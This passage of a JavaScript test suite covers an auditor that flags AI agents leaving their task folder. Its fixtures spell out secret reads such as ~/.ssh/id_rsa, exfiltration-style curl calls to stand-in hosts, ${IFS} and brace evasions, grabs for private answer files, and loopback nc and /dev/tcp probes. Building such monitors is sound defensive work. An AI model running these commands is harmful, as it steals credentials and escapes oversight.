  assert.equal(twoCalls.violations.length, 2, 'two separate calls are two violations');
  const several = fx.audit(bash('cat /etc/hosts ~/x ../../y'));
  assert.deepEqual(kinds(several).sort(), ['abs', 'dotdot', 'home']);
  const file = fx.audit(tool('Write', { file_path: '/tmp/zzz', content: 'x' }));
  assert.equal(file.violations[0].tool, 'Write');
  assert.match(file.violations[0].call, /^Write \{/);
});

test('one violation anywhere discards the whole run', t => {
  const fx = fixture(t);
  const events = [bash('ls filesystem'), tool('Read', { file_path: 'filesystem/a.csv' }), bash('python3 outputs/a.py'), bash('cat /etc/hosts'), bash('ls outputs')];
  const result = fx.audit(events);
  assert.equal(result.status, 'DISCARDED');
  assert.equal(result.violations.length, 1);
});

test('leak-in-results is a note, never a violation', t => {
  const fx = fixture(t);
  const events = [
    bash('ls filesystem'),
    { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'call-1', content: 'listing of /srv/synthetic-project/private/ files' }] } },
    { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'call-2', content: [{ type: 'text', text: 'path /srv/synthetic-project/src' }] }] } },
    { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'call-3', content: 'nothing special' }] } },
  ];
  const withRoot = fx.audit(events, { projectRoot: '/srv/synthetic-project' });
  assert.equal(withRoot.status, 'CLEAN');
  assert.deepEqual(withRoot.notes.sort(), [
    'leak-in-results: tool result call-1 mentions the project root or private/',
    'leak-in-results: tool result call-2 mentions the project root or private/',
  ]);
  const withoutRoot = fx.audit(events);
  assert.deepEqual(withoutRoot.notes, ['leak-in-results: tool result call-1 mentions the project root or private/']);
  assert.equal(withoutRoot.status, 'CLEAN');
});

test('a call that cannot be analysed fails closed instead of being trusted', t => {
  const fx = fixture(t);
  const deep = fx.audit(bash('echo ' + '"$('.repeat(500)));
  assert.equal(deep.status, 'DISCARDED');
  assert.ok(deep.notes.some(note => note.startsWith('audit-error:') && /nesting/.test(note)));
  assert.equal(fx.audit(bash('echo "$(echo "$(echo "$(echo hi)")")"')).status, 'CLEAN', 'ordinary nesting is fine');
  const unreadable = { type: 'assistant', message: { content: [{ type: 'tool_use', id: 'unreadable-1', name: 'Bash', input: { get command() { throw new Error('boom'); } } }] } };
  const result = fx.audit([unreadable, bash('ls filesystem')]);
  assert.equal(result.status, 'DISCARDED');
  assert.equal(result.violations.length, 1);
  assert.match(result.notes[0], /^audit-error: a Bash call could not be analysed \(boom\)$/);
});

test('ordinary solver commands are clean', t => {
  const fx = fixture(t);
  const commands = [
    'ls -la', 'ls -la filesystem/ outputs/', 'pwd', 'python3 --version && pip list 2>/dev/null | grep -i openpyxl',
    'python3 -c "import openpyxl; print(openpyxl.__version__)"', 'head -50 filesystem/data.csv', 'file filesystem/*', 'wc -l filesystem/*.csv',
    'cat filesystem/*.txt | head -100', 'find filesystem -type f -exec ls -la {} \\;', 'find . -type f -name "*.xlsx" | head',
    'unzip -o filesystem/pack.zip -d outputs/unz', 'soffice --headless --convert-to csv --outdir outputs filesystem/m.xlsx',
    "python3 << 'PYEOF'\nimport pandas as pd\ndf = pd.read_excel('filesystem/m.xlsx', sheet_name=None)\nfor n, d in df.items(): print(n, d.shape, d.iloc[0,0]/d.iloc[1,0])\nPYEOF",
    'pdftotext -layout filesystem/doc.pdf - | head -200', 'cd outputs && python3 analysis.py', 'python3 outputs/analysis.py > outputs/result.txt 2>&1',
    'echo "Final answer: net debt / EBITDA = 3.2x (FY24/FY23)" > outputs/answer.md', 'grep -n -i "covenant" filesystem/*.txt', "sed -n '10,40p' filesystem/a.txt",
    "awk -F, 'NR>1 {s+=$3} END {print s}' filesystem/a.csv", 'sort filesystem/a.csv | uniq -c | sort -rn | head', 'mkdir -p outputs/work && cp filesystem/a.csv outputs/work/',
    'diff <(sort filesystem/a) <(sort filesystem/b)', 'which libreoffice; command -v python3; type pdftotext',
    'python3 -m venv .tmp/venv && source .tmp/venv/bin/activate && pip install openpyxl', 'pip install --target .tmp/pkgs pandas', 'export PYTHONPATH=$PWD/.tmp/pkgs',
    'for f in filesystem/*.csv; do echo "== $f"; head -3 "$f"; done', 'tail -n +2 filesystem/a.csv | cut -d, -f1 | sort -u', "jq '.items[] | select(.x > 3)' filesystem/a.json",
    'echo "scale=4; 10/3" | bc', "perl -ne 'print if /foo/' filesystem/a.txt", "sed -E 's|/old/path|/new/path|' filesystem/a.txt", 'sqlite3 outputs/db.sqlite "select a/b from t"',
    "python3 -c \"import re; print(re.findall(r'\\d+/\\d+', '12/31 and 1/2'))\"", 'mktemp -d', 'readlink -f filesystem/a.csv', 'tr -d "\\r" < filesystem/a.csv > outputs/a.csv',
    "cat > outputs/notes.md <<'EOF'\n# Notes\n- Debt/EBITDA: 3.2x (FY24/FY23)\n- See https://example.com/x/y/z\n- ratio = a / b\nEOF",
  ];
  for (const command of commands) assert.deepEqual(fx.audit(bash(command)).violations, [], command);
});

test('ordinary ways out of the folder are caught', t => {
  const fx = fixture(t);
  const escapes = [
    ['cat ../../private/answer.xlsx', 'dotdot'], ['ls ~/Desktop', 'home'], ['find / -name "*.xlsx"', 'bare-root'], ['cat /Users/someone/Downloads/answer.xlsx', 'abs'],
    ['cd .. && ls', 'dotdot'], ['ls ../*', 'dotdot'], ['cat $(find / -name rubric.docx)', 'bare-root'], ['grep -r answer /', 'bare-root'], ['ls /tmp', 'abs'],
    ['python3 -c "import glob; print(glob.glob(\'/Users/*/*\'))"', 'abs'], ['python3 -c "import os; print(os.listdir(\'/\'))"', 'bare-root'],
    ['python3 -c "import glob; print(glob.glob(\'/*\'))"', 'bare-root'], ['node -e "console.log(require(\'fs\').readdirSync(\'/\'))"', 'bare-root'],
    ['cp ../other/outputs/a.csv outputs/', 'dotdot'], ['ln -s ../.. up && ls up', 'dotdot'], ['cat /proc/self/environ', 'abs'], ['ls -la ~', 'home'], ['cat ~root/.ssh/id_rsa', 'home'],
    ['tar -xf outputs/a.tar -C /tmp', 'abs'], ['git -C /tmp/other log', 'abs'], ['rsync -a filesystem/ /tmp/copy/', 'abs'], ['sqlite3 /var/db/x.db "select 1"', 'abs'],
  ];
  for (const [command, kind] of escapes) assert.ok(kinds(fx.audit(bash(command))).includes(kind), `${command} should be ${kind}`);
});

test('brace words cannot make the audit slow', t => {
  const fx = fixture(t);
  const started = Date.now();
  for (const command of ['echo ' + '{'.repeat(60000), 'echo ' + '{a,b}'.repeat(5000), 'echo ' + '{'.repeat(3000) + 'a,b' + '}'.repeat(3000), 'echo ' + '${x'.repeat(20000), 'echo {' + 'a,'.repeat(40000) + 'b}']) {
    assert.doesNotThrow(() => fx.audit(bash(command)));
  }
  assert.ok(Date.now() - started < 4000, `brace-heavy input took ${Date.now() - started} ms`);
});

test('hostile or malformed commands never throw and stay fast', t => {
  const fx = fixture(t);
  const pieces = ["'", '"', '`', '$', '(', ')', '{', '}', '<', '>', '|', '&', ';', '\\', '\n', ' ', '/', '.', '~', '#', '=', 'a', 'b', 'HOME', 'cd ', '$(', '<<', 'EOF', '\u0001', '-c ', 'sed ', '..', '*', '<<<', '${', '$((', '2>&1', 'bash -c '];
  let seed = 12345;
  const random = () => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; };
  for (let i = 0; i < 3000; i++) {
    let text = '';
    const length = 1 + Math.floor(random() * 40);
    for (let j = 0; j < length; j++) text += pieces[Math.floor(random() * pieces.length)];
    assert.doesNotThrow(() => fx.audit([bash(text), tool('Write', { file_path: text, content: text }), tool('Grep', { pattern: text, path: text })]), JSON.stringify(text));
  }
  const started = Date.now();
  fx.audit(bash('echo ' + 'a/b '.repeat(40000)));
  fx.audit(bash('cat <<EOF\n' + 'line /x y\n'.repeat(50000) + 'EOF'));
  fx.audit(bash('echo ' + '$('.repeat(5000)));
  fx.audit(bash('echo ' + '"'.repeat(5001)));
  assert.ok(Date.now() - started < 5000, 'large inputs are audited in bounded time');
  assert.doesNotThrow(() => fx.audit([{ type: 'assistant', message: { content: [{ type: 'tool_use', id: 'x', name: 'Bash', input: { command: 42 } }, { type: 'tool_use', id: 'y', name: 'Read', input: null }, { type: 'tool_use', name: 7, input: {} }] } }]));
});

/* ------------------------------------------------------------------ URLs, word splitting and brace words */

test('a URL hides nothing: substitutions inside it are audited and a host-less x:// is a path', t => {
  const fx = fixture(t);
  const secret = path.join(fx.base, 'secret.txt');
  assertFlags(fx, bash(`echo $(cat "${secret}")`), 'abs', 'the plain form');
  assertFlags(fx, bash(`echo https://x/$(cat "${secret}")`), 'abs', 'the same command inside a URL word');
  assertFlags(fx, bash(`echo "see https://x/$(ls ${fx.base})"`), 'abs', 'inside a quoted sentence with a URL');
  assertFlags(fx, bash(`echo https://x/\`cat ${secret}\``), 'abs', 'backticks inside a URL word');
  assertFlags(fx, bash(`curl -s https://example.com/?q=$(cat ${secret})`), 'abs');
  assertFlags(fx, bash('ls x://../../outside'), 'dotdot', 'no host: this is a relative path');
  assertFlags(fx, bash('cat x://../../outside/secret.txt'), 'dotdot');
  assertFlags(fx, bash('echo hi > x://../../outside/w.txt'), 'dotdot', 'a redirect target');
  assertFlags(fx, bash(`python3 -c "import os; os.system('echo https://x/$(cat ${secret})')"`), 'abs', 'inline code with a URL');
  assertFlags(fx, tool('Write', { file_path: 'outputs/run.sh', content: `curl https://x/$(cat ${secret})\n` }), 'abs', 'file content with a URL');
  assertFlags(fx, tool('Write', { file_path: 'outputs/run.sh', content: `echo https://x/$(cat,${secret})` }), 'abs', 'the URL match stops at $ in free text');
  assertFlags(fx, tool('Read', { file_path: 'https://x/$HOME/a' }), 'home', 'a path field with an expansion is not exempt as a URL');
  assertClean(fx, tool('Read', { file_path: 'https://example.com/../../../../b.csv' }), 'a path field that is a plain URL');
  assertClean(fx, bash('curl -s https://example.com/../../../../b.csv -o outputs/b.csv'), 'a real URL may hold ..');
  assertClean(fx, bash('curl -s "http://example.com/some/path?x=/etc/passwd" -o outputs/c.txt'), 'a URL with a path-like query');
  assertClean(fx, bash('wget -q ftp://user@files.example.com/pub/a.csv -O outputs/a.csv'));
  assertClean(fx, bash('echo "see https://example.com/a/b/c for details" > outputs/note.txt'));
  assertClean(fx, tool('Write', { file_path: 'outputs/note.md', content: 'Source: https://example.com/a/b/c and http://x.org/y/z' }));
});

test('${IFS}, $IFS and brace words split into the words the shell would run', t => {
  const fx = fixture(t);
  const secret = path.join(fx.base, 'secret.txt');
  assertFlags(fx, bash(`cat\${IFS}${secret}`), 'abs', '${IFS} as a separator');
  assertFlags(fx, bash(`cat$IFS${secret}`), 'abs', '$IFS as a separator');
  assertFlags(fx, bash(`echo https://x/$(cat\${IFS}${secret})`), 'abs', '${IFS} inside a substitution inside a URL');
  assertFlags(fx, bash(`curl -s https://example.com/?q=$(cat$IFS${secret})`), 'abs');
  assertFlags(fx, bash(`{cat,${secret}}`), 'abs', 'a brace word as the whole command');
  assertFlags(fx, bash(`echo https://x/$({cat,${secret}})`), 'abs', 'a brace word inside a substitution inside a URL');
  assertFlags(fx, bash(`ls x://$({ls,${fx.base}/pilots})`), 'abs');
  assertFlags(fx, bash('cat {a,../../b}.txt'), 'dotdot', 'one alternative leaves the folder');
  assertFlags(fx, bash('ls {filesystem,/etc}'), 'abs');
  assertFlags(fx, bash('ls {x,y}/{b,../../c}'), 'dotdot', 'two groups');
  assertClean(fx, bash('mkdir -p outputs/{a,b} && ls outputs/{a,b} && echo {1..3} {x,y}'), 'groups that stay inside the folder');
  assertClean(fx, bash('x=${HOME_UNSET:-a,b}; echo ${#x}'), 'a comma inside ${...} is not a brace group');
  assertClean(fx, bash('echo "{cat,/etc/passwd}" \'{cat,/etc/passwd}\''), 'quoted braces are text');
  assertClean(fx, bash('echo ${IFSX} "a${IFS}b"'), 'a longer name and a quoted ${IFS} do not split');
  assertClean(fx, bash('find filesystem -name "*.csv" -exec head -2 {} \;'), '{} is not a group');
  assertClean(fx, bash('printf "%s" {a,b,c}{a,b,c}{a,b,c}{a,b,c}'), '81 words are looked at in full');
  assert.equal(fx.audit(bash('echo ' + '{a,b}'.repeat(11))).status, 'DISCARDED', '2048 words are too many to look at');
  assert.equal(fx.audit(bash('echo ' + '{a,b}'.repeat(9))).status, 'CLEAN', '512 words are not');
  const huge = fx.audit(bash('printf "%s" {a,b,c,d,e,f,g,h}{a,b,c,d,e,f,g,h}{a,b,c,d,e,f,g,h}{a,b,c,d,e,f,g,h}'));
  assert.equal(huge.status, 'DISCARDED', 'an expansion too large to look at fails closed');
  assert.ok(huge.notes.some(note => /^audit-error: .*brace expansion is too large/.test(note)), huge.notes.join(' | '));
  assertFlags(fx, bash('ls {a,/etc/passwd}{1,2}{1,2}{1,2}{1,2}{1,2}{1,2}{1,2}{1,2}'), 'abs', 'a large expansion cannot hide an alternative that leaves the folder');
});

test('notes name the shapes the audit cannot read from the text', t => {
  const fx = fixture(t);
  const noteKinds = events => fx.audit(events).notes.map(note => note.split(':')[0]);
  assert.deepEqual(noteKinds(bash('eval "$(echo ls)"')).sort(), ['unverifiable-code', 'unverifiable-command']);
  assert.deepEqual(noteKinds(bash('bash -c "$CMD"')).sort(), ['unverifiable-code', 'unverifiable-command']);
  assert.deepEqual(noteKinds(bash('echo aGk= | base64 -d | sh')), ['unverifiable-input']);
  assert.deepEqual(noteKinds(bash('$TOOL filesystem/a.csv')), ['unverifiable-command']);
  assert.deepEqual(noteKinds(bash('$(echo ls) filesystem')), ['unverifiable-command']);
  assert.deepEqual(noteKinds(bash('cd "$SOMEWHERE"')), ['cwd-unresolved']);
  assert.deepEqual(noteKinds(bash('eval "ls filesystem"')), [], 'eval of known text is read in full');
  assert.deepEqual(noteKinds(bash("bash <<'EOF'\nls filesystem\nEOF")), [], 'a here document is read in full');
  assert.deepEqual(noteKinds(bash('bash -c "ls filesystem" && bash script.sh && for f in filesystem/*; do head -1 "$f"; done')), []);
  assert.equal(fx.audit(bash('echo aGk= | base64 -d | sh')).status, 'CLEAN', 'a note is not a violation');
});

/* ------------------------------------------------------------------ text mode boundaries */

test('text mode sees a path glued to < or > and still ignores closing tags', t => {
  const fx = fixture(t);
  assertFlags(fx, tool('Write', { file_path: 'outputs/a.py', content: 'os.system("echo hi>/tmp/synthetic-planted")' }), 'abs', 'redirect out');
  assertFlags(fx, tool('Write', { file_path: 'outputs/a.py', content: 'subprocess.run("cat</tmp/synthetic-secret.txt", shell=True)' }), 'abs', 'redirect in');
  assertFlags(fx, tool('Write', { file_path: 'outputs/a.pl', content: 'open(F,"</tmp/synthetic-secret.txt");' }), 'abs', 'perl open');
  assertFlags(fx, tool('Write', { file_path: 'outputs/a.py', content: 'os.system("ls 2>/tmp/synthetic-err")' }), 'abs', 'stderr redirect');
  assertFlags(fx, tool('Write', { file_path: 'outputs/a.py', content: 'os.system("cat<../../secret")' }), 'dotdot');
  assertFlags(fx, tool('Write', { file_path: 'outputs/a.py', content: 'os.system("cat<~/.ssh/key")' }), 'home');
  assertFlags(fx, bash(`python3 -c 'import os; os.system("echo hi>/tmp/synthetic-planted")'`), 'abs', 'inline code');
  assertFlags(fx, bash("python3 <<'EOF'\nimport os\nos.system('cat</tmp/synthetic-secret.txt')\nEOF"), 'abs', 'here document code');
  assertClean(fx, tool('Write', { file_path: 'outputs/run.sh', content: '#!/opt/synthetic/bin/python\nprint(1)\n' }), 'a shebang line names a program, it does not use it');
  assertClean(fx, tool('Write', { file_path: 'outputs/run.sh', content: '#!/usr/bin/env python3\nprint(1)\n' }), 'the usual shebang');
  assertClean(fx, tool('Write', { file_path: 'outputs/tree.xml', content: '<root><home>a</home><tmp>b</tmp></root>' }), 'closing tags');
  assertClean(fx, tool('Write', { file_path: 'outputs/tree.xml', content: '<a><etc>x</etc></a>\n<var:x></var:x><usr:y/></usr:y>' }), 'closing tags with namespaces');
  assertClean(fx, tool('Write', { file_path: 'outputs/model.py', content: 'margin = (rev - cost)/rev/ebit\nfiles = glob("**/src/main.py")\n' }), 'division chains and globs');
  assertClean(fx, tool('Write', { file_path: 'outputs/memo.md', content: 'A&B/C and 5>3/2 are not paths; a -> b; x<y/2' }));
});

/* ------------------------------------------------------------------ working directory tracking, in both directions */

test('the tracked working directory is restored exactly: each construct has a clean case and an escaping case', t => {
  const fx = fixture(t);
  /* Each escaping case below is clean if the construct under test restores (or fails to restore) the directory wrongly. */
  assertFlags(fx, bash('cd filesystem; cd -; cat ../x'), 'dotdot', 'cd - returns to the folder');
  assertClean(fx, bash('cd filesystem; cd -; cat filesystem/a.csv'));
  assertFlags(fx, bash('(cd filesystem); cat ../x'), 'dotdot', 'a subshell does not keep its cd');
  assertClean(fx, bash('(cd filesystem; cat ../outputs/a); cat filesystem/a.csv'));
  assertFlags(fx, bash('x=$(cd filesystem); cat ../x'), 'dotdot', 'a command substitution does not keep its cd');
  assertClean(fx, bash('x=$(cd filesystem; pwd); cat filesystem/a.csv'));
  assertFlags(fx, bash("bash -c 'cd filesystem'; cat ../x"), 'dotdot', 'bash -c does not keep its cd');
  assertFlags(fx, bash("bash <<'EOF'\ncd filesystem\nEOF\ncat ../x"), 'dotdot', 'a here document shell does not keep its cd');
  assertFlags(fx, bash('pushd filesystem; popd; ls ..'), 'dotdot', 'popd returns to the folder');
  assertClean(fx, bash('pushd filesystem; ls ../outputs; popd; ls filesystem'));
  assertFlags(fx, bash('eval "cd filesystem"; ls ../..'), 'dotdot', 'eval keeps its cd');
  assertClean(fx, bash('eval "cd filesystem"; ls ../outputs'), 'eval keeps its cd (clean side)');
  /* The same pairs for variables. */
  assertFlags(fx, bash('D=/etc; (D=filesystem); cat $D/passwd'), 'abs', 'a subshell does not keep its variable');
  assertFlags(fx, bash('D=/etc; x=$(D=filesystem); cat $D/passwd'), 'abs', 'a substitution does not keep its variable');
  assertFlags(fx, bash("D=/etc; bash -c 'D=filesystem'; cat $D/passwd"), 'abs', 'bash -c does not keep its variable');
  assertClean(fx, bash('D=/etc; D=filesystem; cat $D/a.csv'), 'a plain assignment is kept');
  assertClean(fx, bash('D=/etc; eval "D=filesystem"; cat $D/a.csv'), 'eval keeps its variable');
});

test('cd - is only trusted after a cd in the same command; a first cd - jumps to an unknown OLDPWD', t => {
  const fx = fixture(t);
  const first = assertFlags(fx, bash('cd - && cat secret.txt'), 'home', 'a first cd - may land anywhere');
  assert.ok(first.notes.some(note => note.startsWith('cwd-unresolved')));
  assertFlags(fx, bash('cd - >/dev/null; cat secret.txt'), 'home');
  assertFlags(fx, [bash('cd filesystem'), bash('cd - && ls')], 'home', 'a new call may be a new shell, so its OLDPWD is unknown again');
  assertClean(fx, bash('cd filesystem && cd - && ls'), 'a cd earlier in the same command makes it known');
  assertClean(fx, [bash('cd filesystem'), bash('cd .. && cd filesystem && cd - && ls')]);
  const outside = path.join(fx.base, 'elsewhere');
  const inherited = fx.audit(bash('cd - && cat secret.txt'), { env: { OLDPWD: outside } });
  assert.ok(kinds(inherited).includes('abs'), 'an inherited OLDPWD outside the folder is an abs violation: ' + JSON.stringify(inherited.violations));
  assert.equal(fx.audit(bash('cd - && ls'), { env: { OLDPWD: path.join(fx.folder, 'filesystem') } }).status, 'CLEAN', 'an inherited OLDPWD inside the folder is fine');
});

test('a cd that cannot be resolved says so plainly in its note', t => {
  const fx = fixture(t);
  const result = fx.audit(bash('cd "${PWD%/*}"; ls plain-name'));
  assert.equal(result.status, 'CLEAN', 'plain names after an unknown cd are not flagged (documented limitation)');
  assert.equal(result.notes.length, 1);
  assert.match(result.notes[0], /^cwd-unresolved: .*relative paths after it cannot be checked/);
  assertFlags(fx, bash('cd "$(dirname "$PWD")"; ls ../x'), 'dotdot');
});

/* ------------------------------------------------------------------ inherited environment */

test('variables the pilot inherited are looked up when the environment is given', t => {
  const fx = fixture(t);
  const root = '/srv/synthetic-project';
  const env = { INIT_CWD: root, npm_config_local_prefix: root, PATH: '/usr/bin:/bin', VIRTUAL_ENV: '/opt/synthetic-venv', EMPTY: '', REL: 'relative/dir', SHELL: '/bin/zsh' };
  const events = [bash('cat "$npm_config_local_prefix/private/x"'), bash('cd $INIT_CWD && ls'), bash('ls ${INIT_CWD}/private'), tool('Glob', { pattern: 'x', path: '$INIT_CWD' })];
  const without = fx.audit(events);
  assert.equal(without.status, 'CLEAN', 'documented limitation: without the environment an unknown variable cannot be resolved');
  const withEnv = fx.audit(events, { env });
  assert.ok(withEnv.violations.length >= 3, JSON.stringify(withEnv.violations));
  assert.ok(withEnv.violations.some(v => v.path.startsWith(root)));
  assert.deepEqual(kinds(fx.audit(bash('$VIRTUAL_ENV/bin/python x.py'), { env })), ['abs']);
  const shadowed = fx.audit(bash('VIRTUAL_ENV=filesystem; cat $VIRTUAL_ENV/a.csv && cat $INIT_CWD/x'), { env });
  assert.deepEqual(shadowed.violations.map(v => v.path), [path.join(root, 'x')], 'a variable the command sets wins over the inherited one');
  const clean = fx.audit(bash('echo $VIRTUAL_ENV $PATH $EMPTY $REL; echo "$SHELL"; cat $REL/a.csv; ls $EMPTY; for f in filesystem/*.csv; do head -1 "$f"; done; echo $TMPDIR $PWD'), { env });
  assert.deepEqual(clean.violations, [], 'printing a variable is not an access; lists, relative values and empty values stay unknown');
  assert.equal(fx.audit(bash('cat $UNSET_VARIABLE/x'), { env }).status, 'CLEAN');
  assert.equal(fx.audit(bash('ls $HOME_LIKE'), { env: { HOME_LIKE: '/bin/sh' } }).status, 'CLEAN', 'an allowlisted program path may be used');
  assert.equal(fx.audit(bash('x=1'), { env: 'nope' }).status, 'CLEAN', 'a bad env option is ignored');
});

/* ------------------------------------------------------------------ cost caps and the time budget */

test('repeated cd, long paths and large commands are bounded, and a cap fails closed', t => {
  const fx = fixture(t);
  const started = Date.now();
  const many = fx.audit(bash('cd a;'.repeat(1000)));
  assert.equal(many.status, 'CLEAN');
  assert.ok(Date.now() - started < 3000, `1000 cd commands took ${Date.now() - started} ms`);
  const deep = fx.audit(bash('cd ' + 'a/'.repeat(30000) + '; ls x'));
  assert.equal(deep.status, 'DISCARDED');
  assert.ok(deep.notes.some(note => /^audit-error: .*too (long|many segments)/.test(note)), deep.notes.join(' | '));
  const chain = fx.audit(bash('cd a;'.repeat(5000)));
  assert.equal(chain.status, 'DISCARDED', 'a chain of cd commands past the path length cap fails closed');
  assert.ok(chain.notes.some(note => /^audit-error: .*path is too long/.test(note)));
  const long = fx.audit(bash('echo ' + 'x'.repeat(1100000)));
  assert.equal(long.status, 'DISCARDED');
  assert.ok(long.notes.some(note => /^audit-error: .*command is too long/.test(note)));
  const statements = fx.audit(bash('true;'.repeat(25000)));
  assert.equal(statements.status, 'DISCARDED');
  assert.ok(statements.notes.some(note => /^audit-error: .*too many shell statements/.test(note)));
  const afterwards = fx.audit([bash('true;'.repeat(25000)), bash('ls filesystem')]);
  assert.equal(afterwards.violations.length, 1, 'a call that hits a cap does not poison the next call');
});

test('the audit has a time budget, and a call that runs out of it fails closed', t => {
  const fx = fixture(t);
  let now = 0;
  const clock = () => (now += 500);
  const result = fx.audit([bash('ls filesystem'), bash('cat outputs/a.csv')], { budgetMs: 1000, clock });
  assert.equal(result.status, 'DISCARDED');
  assert.ok(result.notes.some(note => /^audit-error: a Bash call could not be analysed \(the audit time budget was used up\)$/.test(note)), result.notes.join(' | '));
  now = 0;
  const generous = fx.audit([bash('ls filesystem')], { budgetMs: 1e9, clock });
  assert.equal(generous.status, 'CLEAN');
  assert.equal(fx.audit(bash('ls filesystem'), { budgetMs: 'soon' }).status, 'CLEAN', 'a bad budget falls back to the default');
});

/* ------------------------------------------------------------------ the folder and the command name */

test('running a program from outside the folder is an access, with or without a wrapper', t => {
  const fx = fixture(t);
  assertFlags(fx, bash('/opt/elsewhere/run.sh'), 'abs');
  assertFlags(fx, bash('/Users/someone/bin/solver --all'), 'abs');
  assertFlags(fx, bash('../sibling/tool'), 'dotdot');
  assertFlags(fx, bash('~/bin/tool'), 'home');
  assertFlags(fx, bash('$HOME/bin/tool'), 'home');
  assertFlags(fx, bash('$(echo /x)/tool'), 'abs');
  for (const wrapper of ['env', 'time', 'sudo', 'nohup', 'timeout 5', 'command', 'nice -n 5']) {
    assertFlags(fx, bash(`${wrapper} /opt/elsewhere/run.sh`), 'abs', wrapper);
    assertFlags(fx, bash(`${wrapper} ../sibling/tool`), 'dotdot', wrapper);
  }
  assertFlags(fx, bash('FOO=1 /opt/elsewhere/run.sh'), 'abs', 'an environment prefix');
  assertFlags(fx, bash('nohup /opt/elsewhere/run.sh &'), 'abs');
  assertClean(fx, bash('/usr/bin/env python3 --version'), 'the allowlisted env program');
  assertClean(fx, bash('./outputs/run.sh; filesystem/tool; outputs/run.sh arg'), 'programs inside the folder');
  assertClean(fx, bash(`${path.join(fx.folder, 'outputs', 'run.sh')} --all`), 'a program inside the folder by absolute path');
});

test('harness spill is found through a relative path, and ~/ inside code or file content is a home access', t => {
  const fx = fixture(t);
  const relative = path.relative(fx.folder, path.join(fx.configDir, 'projects', 'x', 'tool-results', 'y.txt'));
  assert.ok(relative.startsWith('..'));
  assertFlags(fx, bash(`cat ${relative}`), 'harness-spill', 'a relative path to the configuration directory');
  assertFlags(fx, tool('Read', { file_path: relative }), 'harness-spill', 'the Read tool with that relative path');
  assertFlags(fx, bash('cd filesystem && cat ' + path.relative(path.join(fx.folder, 'filesystem'), path.join(fx.configDir, 'projects')) + '/x/tool-results/y.txt'), 'harness-spill');
  assertFlags(fx, bash(`python3 -c "import os; os.system('cat ~/.ssh/id_rsa')"`), 'home', 'tilde in python code');
  assertFlags(fx, tool('Write', { file_path: 'outputs/steal.sh', content: 'cat ~/.ssh/id_rsa\n' }), 'home', 'tilde in file content');
  assertFlags(fx, bash(`node -e "require('child_process').execSync('ls ~/Documents')"`), 'home', 'tilde in node code');
  assertFlags(fx, bash("python3 <<'EOF'\nimport os\nos.system('cat ~/.ssh/id_rsa')\nEOF"), 'home', 'tilde in a here document');
  const spill = fx.audit(tool('Write', { file_path: 'outputs/x.sh', content: `cat ${path.join(fx.configDir, 'projects')}/a` }));
  assert.deepEqual(kinds(spill), ['harness-spill'], 'an absolute spill path in free text is a spill, not a home access');
  assertClean(fx, tool('Write', { file_path: 'outputs/memo.md', content: 'about 5% (~5%) of revenue, roughly ~ 3 or a~b' }), 'a tilde that is not followed by a path');
});

test('leak-in-results ignores the physical names macOS gives its system folders', t => {
  const fx = fixture(t);
  const leak = text => fx.audit([bash('pwd'), { type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'r1', content: text }] } }]).notes;
  assert.deepEqual(leak('/private/var/folders/ab/cd/T/finance-studio-pilots/rnd-aaaaaaaaaaaa-1'), []);
  assert.deepEqual(leak('/private/tmp/x and /private/etc/hosts'), []);
  assert.deepEqual(leak('cwd=/private/var/folders/ab/cd/T/run (see /private/var)'), []);
  assert.equal(leak('/srv/synthetic-project/private/answers').length, 1, 'the project private folder still counts');
  assert.equal(leak('listing: private/answers.txt').length, 1);
  assert.equal(leak('/private/var/folders/x then /srv/synthetic-project/private/answers').length, 1, 'a real mention next to a system path still counts');
  assert.equal(leak('/Users/me/private/var/notes').length, 1, 'only the root level /private/var is a system folder');
  assert.equal(leak('/private/variants/x').length, 1, '/private/variants is not /private/var');
});

/* ------------------------------------------------------------------ loopback: the companion and anything else on this machine */

const COMPANION_PORT = 43123;

test('loopback: every way of reaching this machine is a violation of its own kind, and it discards the run', t => {
  const fx = fixture(t);
  const forms = [
    /* curl and wget */
    ['curl', bash('curl -s http://127.0.0.1:43123/api/agents/rounds/rnd-000000000000')],
    ['curl host:port', bash('curl -s localhost:43123/api/status')],
    ['curl bare host', bash('curl localhost')],
    ['curl IPv6', bash('curl -g "http://[::1]:43123/api/status"')],
    ['curl 0.0.0.0', bash('curl 0.0.0.0:43123')],
    ['curl another 127 address', bash('curl http://127.9.8.7/x')],
    ['curl short form', bash('curl http://127.1:43123/')],
    ['curl decimal form', bash('curl http://2130706433/')],
    ['curl host 0', bash('curl http://0:43123/')],
    ['curl *.localhost', bash('curl http://studio.localhost:43123/')],
    ['curl long IPv6', bash('curl "http://[0:0:0:0:0:0:0:1]:43123/"')],
    ['curl IPv4 mapped IPv6', bash('curl "http://[::ffff:127.0.0.1]/"')],
    ['curl unspecified IPv6', bash('curl "http://[::]:43123/"')],
    ['curl uppercase', bash('curl HTTP://LOCALHOST:43123/')],
    ['curl short form as a word', bash('curl 127.1:43123')],
    ['wget', bash('wget -qO- http://localhost:43123/api/status')],
    ['wget bare address', bash('wget 127.0.0.1')],
    /* nc */
    ['nc address', bash('nc 127.0.0.1 43123')],
    ['nc name', bash('nc localhost 80')],
    ['nc IPv6', bash('nc -z ::1 43123')],
    ['nc in a pipe', bash('printf "GET /api/status HTTP/1.0\\r\\n\\r\\n" | nc localhost 43123 > outputs/s.txt')],
    /* python urllib and requests, node fetch and http */
    ['python urllib', bash(`python3 -c "import urllib.request; print(urllib.request.urlopen('http://127.0.0.1:43123/api/status').read())"`)],
    ['python requests', bash(`python3 -c "import requests; print(requests.get('http://localhost:43123/api/status').text)"`)],
    ['python http.client', bash(`python3 -c "import http.client; c = http.client.HTTPConnection('localhost', 43123); c.request('GET', '/x')"`)],
    ['python socket', bash("python3 - <<'EOF'\nimport socket\ns = socket.create_connection(('127.0.0.1', 43123))\nEOF")],
    ['node fetch', bash(`node -e "fetch('http://127.0.0.1:43123/api/status').then(r => r.text()).then(console.log)"`)],
    ['node http', bash(`node -e "require('http').get({ host: 'localhost', port: 43123 }, r => r.pipe(process.stdout))"`)],
    /* /dev/tcp */
    ['/dev/tcp address', bash('exec 3<>/dev/tcp/127.0.0.1/43123')],
    ['/dev/tcp name', bash('cat < /dev/tcp/localhost/43123')],
    /* a bare URL, in any tool and any text */
